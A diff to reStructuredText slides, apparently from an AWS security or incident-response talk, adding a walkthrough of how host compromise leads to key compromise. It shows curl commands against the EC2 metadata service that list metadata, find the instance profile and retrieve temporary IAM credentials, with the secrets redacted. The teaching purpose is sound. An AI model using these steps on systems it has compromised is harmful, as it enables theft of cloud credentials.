@@ -139,7 +139,98 @@ Common Types of Attacks
 1. Host Based Compromise
 2. Key Based Compromise
 
-( this is where we talk about access keys will kill you before you kill the password )
+.. image:: static/hk-kc.png
+   :align: center
+
+-----------------
+
+How does this happen?
+=================================
+
+* Zero-Days
+* Default Credentials
+* Carelessness
+
+**They do happen!  This can happen to you.**
+
+-----------------
+
+HC can become KC
+====================
+
+Ever heard of the metadata service?
+-------------------------------------
+
+-----------------
+
+**MetaData Service**
+
+.. code-block:: bash
+
+    https://aws.amazon.com/amazon-linux-ami/2016.03-release-notes/
+    13 package(s) needed for security, out of 26 available
+    Run "sudo yum update" to apply all updates.
+    [ec2-user@ip-172-31-37-29 ~]$ curl http://169.254.169.254/latest/meta-data/
+    ami-id
+    ami-launch-index
+    ami-manifest-path
+    block-device-mapping/
+    hostname
+    iam/
+    instance-action
+    instance-id
+    instance-type
+    local-hostname
+    local-ipv4
+    mac
+    metrics/
+    network/
+    placement/
+    profile
+    public-hostname
+    public-ipv4
+    public-keys/
+    reservation-id
+    security-groups
+
+
+-----------------
+
+**Determine Instance Profile**
+
+.. code-block:: bash
+
+    curl http://169.254.169.254/latest/meta-data/iam/info
+    {
+      "Code" : "Success",
+      "LastUpdated" : "2016-09-21T17:00:07Z",
+      "InstanceProfileArn" : "arn:aws:iam::671642278147:instance-profile/\
+      cloudresponse_workstation-cr-16-080120-e5c0-us-west-1",
+      "InstanceProfileId" : "AIPAJJWTONXQ7CLMRENCO"
+    }
+
+-----------------
+
+**Once you know the role name**
+
+.. code-block:: bash
+
+    curl http://169.254.169.254/latest/meta-data/iam/\
+    security-credentials/cloudresponse_workstation-cr-16-080120-e5c0-us-west-1
+    {
+      "Code" : "Success",
+      "LastUpdated" : "2016-09-21T17:00:55Z",
+      "Type" : "AWS-HMAC",
+      "AccessKeyId" : "ASIAJDU**********REDACTED",
+      "SecretAccessKey" : "q7bVQVlV+9/ktjWgh5******REDACTED",
+      "Token" : "FQoDYXdzEGIaDGlEkwRSH8hHG+Oz***********REDACTED",
+      "Expiration" : "2016-09-21T23:05:14Z"
+    }
+
+Winning!
+================================
+
+
 
 -----------------
 
@@ -409,7 +500,7 @@ One of your developers leaks a super privileged access key...
 
 ------------------------------
 
-Then bad things happen
+You save the day?
 ============================
 
 .. image:: static/story3.jpg
